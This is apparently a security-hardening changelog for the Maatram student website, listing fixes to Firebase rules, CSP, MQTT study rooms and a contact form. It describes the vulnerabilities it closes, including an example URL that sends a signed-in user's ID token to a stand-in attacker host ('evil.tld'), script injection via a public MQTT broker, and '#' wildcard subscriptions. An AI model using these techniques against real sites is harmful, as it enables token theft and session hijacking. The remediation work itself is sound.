# Maatram — security hardening round (Sep 18 2026)

Base: `MaatramReelsBlocking/maatram` @ `2fc0c9b`.
Deliverable: `maatram-security-v1.zip`.

**SEO: nothing in this round changes a title, meta description, canonical, OG or
Twitter tag, JSON-LD block, heading, visible word, internal link, `sitemap.xml`
or `robots.txt`. Verified page by page — see "Verification" below.**

---

## 1. Do this first, or half of it does nothing

`firestore.rules` in the repo is inert until it is published:

> Firebase console → project `maatram-859f4` → Build → Firestore Database →
> **Rules** tab → paste the whole new `firestore.rules` → **Publish**.

## 2. Two things only you can do (they are not code)

- **Restrict the Firebase Web API key.** Google Cloud console → APIs & Services →
  Credentials → the browser key → Application restrictions → **HTTP referrers** →
  allow `maatram.co.in/*`, `*.maatram.co.in/*` and `maatram-website.vercel.app/*`.
  The key is public by design; this stops it being used from anywhere else.
- **Moderation now lives in the Firebase console.** With `admin.html` gone, the
  rules no longer let any browser write to another person's document. To ban
  someone, set `banned: true` on their user doc in the console — `gate.js` still
  enforces it on every page. The console runs as the Admin SDK, so rules do not
  apply to it.

---

## 3. What changed

### Critical

**`auth-bridge.html` — Google ID token could be sent to any attacker URL.**
`rt` was taken from the query string and used as the token's destination, so
`auth-bridge.html?rt=https://evil.tld` delivered a signed-in student's Firebase
ID token to a stranger. `rt` is now matched against `^maatram://` and anything
else falls back to the default deep link.

**`study-room.html` — remote code execution through the public MQTT broker.**
`p.avatar` and `p.id` came straight off `broker.emqx.io` (open, no auth) into
`innerHTML`. Anyone who knew a room code could run script in every member's
page. Two layers now: every inbound field is type-clamped and length-capped at
the boundary (`clean()`), and both values are escaped at render.

**`study-room.html` — a room code of `#` subscribed you to every room.**
The code went into an MQTT topic unfiltered, and MQTT treats `#` and `+` as
wildcards. Codes are now stripped to `A-Z0-9` before they reach a topic, in
both `study-room.html` and the App Gate relay.

### High

**`firestore.rules` — rewritten around an explicit key allowlist.**
A browser can now write exactly seven fields on a user document:
`name, photo, points, lifetime, lastLogin, cycle, awardAt`. An email address, a
phone number or any other personal field is rejected by the database itself, not
by a promise in the page. This is what makes the leaderboard's collection-wide
read safe: there is nothing personal in there to read. The name a student sets
is still what everyone sees.

Also removed: the admin write path (a compromise of one Gmail account no longer
means write access to every user document), the `admin_log` collection, and
client-side account deletion. Added: a catch-all `deny` on every other path, and
a `^https?://` check on sports-listing URLs. **The points pacing and the ±100 /
3000-point ceilings are unchanged.**

**`vercel.json` — CSP that actually restricts something.**
The old policy set `object-src`, `base-uri` and `frame-ancestors` but no
`default-src` or `script-src`, so injected script from any host would run. The
new policy pins `script-src`, `style-src`, `font-src`, `img-src`, `connect-src`,
`frame-src`, `worker-src`, `media-src` and `form-action` to the exact hosts the
site uses. `'unsafe-inline'` stays for scripts — 15 pages carry inline blocks and
54 inline handlers; removing them is a rewrite, not a security fix, and the
policy still blocks remote-script injection, which is the actual attack.
Added `Cross-Origin-Opener-Policy: same-origin-allow-popups` (the value Google
sign-in needs), `Cross-Origin-Resource-Policy`, `X-Permitted-Cross-Domain-Policies`,
and a wider `Permissions-Policy` deny list.

**`sports.html` — stored `javascript:` links.**
`esc()` neutralises markup but not a URL scheme, and event listings are written
by any signed-in user. A listing URL is now required to be absolute `http(s)` at
render, and the rules reject anything else at write time.

### Medium

**`.vercelignore` (new).** `firestore.rules`, `*.src.js`, `test-*.js`,
`preflight.py`, every `.md`, `docs/` and `.github/` stop being served on
maatram.co.in. They stay in the GitHub repo. None appear in `sitemap.xml` and
none were indexed, so this cannot move a ranking.

**Deleted:** `admin.html`, `ADMIN-README.md`, `test-admin.js` (your call),
`roles.html`, `test-roles.js` (roles feature retired — the page also held the
only code that ever read an email address), `READ-ME.txt`, `FIX-README.md`
(stale kit notes; `test-site.js` had been failing on `READ-ME.txt` for a while
and now passes 22/22). Nothing linked to any of them and none were in the
sitemap.

**Room codes and peer ids** now come from `crypto.getRandomValues` instead of
`Math.random`, over a 32-character alphabet with ambiguous letters removed,
8 characters instead of 6.

**`socials.html` contact form** got a 4000-character cap, a 60-second
per-browser cooldown and FormSubmit's `_honey` honeypot. It was an open relay
into a real inbox.

---

## 4. Known and accepted, still

- The Firebase web config is public. That is how Firebase works; the rules are
  the protection. Restrict the API key by referrer (§2) and that is the end of it.
- Study room contents are not private against someone who has the room code.
  The code is much harder to guess now, but the broker is still public.
- Screen-time figures are entered by the user and are not verified.

## 5. Verification

| Suite | Before | After |
|---|---|---|
| `test-site.js` | 21/22 | **22/22** |
| `test-gate.js` | 53/53 | 53/53 |
| `test-points.js` | pass | pass |
| `test-download.js` | 54/54 | 54/54 |
| `test-sports.js` | 144/144 | 144/144 |
| `test-security.js` *(new)* | — | **54/54** |
| `test-csp.js` *(new)* | — | 19 external requests, **0 blocked** |

Plus a page-by-page comparison against the pre-change tree: title, every meta
tag, every `<link>`, every `<a href>`, every heading, every `<img src>`/`alt`,
and total visible word count — **17 pages, 0 differences.**

`test-csp.js` walks every shipped page for external script, style, font, image,
`fetch` and MQTT target and checks each one against the policy in `vercel.json`.
Run it before adding any new CDN, or the page will silently stop working.

## 6. Deploying

Same route as v8: GitHub web UI, flat root files dragged to the repo root, and
navigate **into** `/wellness` before uploading anything from there. Delete
`admin.html`, `roles.html`, `ADMIN-README.md`, `FIX-README.md`, `READ-ME.txt`,
`test-admin.js` and `test-roles.js` in the GitHub UI — a drag-and-drop upload
adds and replaces files, it never removes them.

Then publish the Firestore rules (§1). The rules are the half that matters.
